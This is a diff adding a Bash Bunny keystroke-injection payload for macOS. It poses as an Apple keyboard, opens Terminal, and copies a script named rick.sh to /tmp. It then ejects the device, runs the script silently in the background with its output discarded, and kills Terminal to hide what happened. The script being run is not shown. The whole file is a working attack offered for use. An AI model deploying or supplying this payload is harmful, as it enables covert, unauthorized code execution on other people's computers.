@@ -1,0 +1,25 @@
+#!/bin/bash
+
+LED SETUP
+ATTACKMODE HID VID_0X05AC PID_0X021E STORAGE
+
+LED ATTACK
+# Open terminal
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 1500
+
+QUACK STRING "cp /Volumes/BashBunny/payloads/${SWITCH_POSITION}/rick.sh /tmp/rick.sh"
+QUACK ENTER
+QUACK DELAY 1000
+
+QUACK STRING "diskutil eject /Volumes/BashBunny/"
+QUACK ENTER
+QUACK STRING "chmod +x /tmp/rick.sh && nohup bash /tmp/rick.sh &> /dev/null &"
+QUACK ENTER
+QUACK STRING "killall Terminal"
+QUACK ENTER
+
+LED FINISH
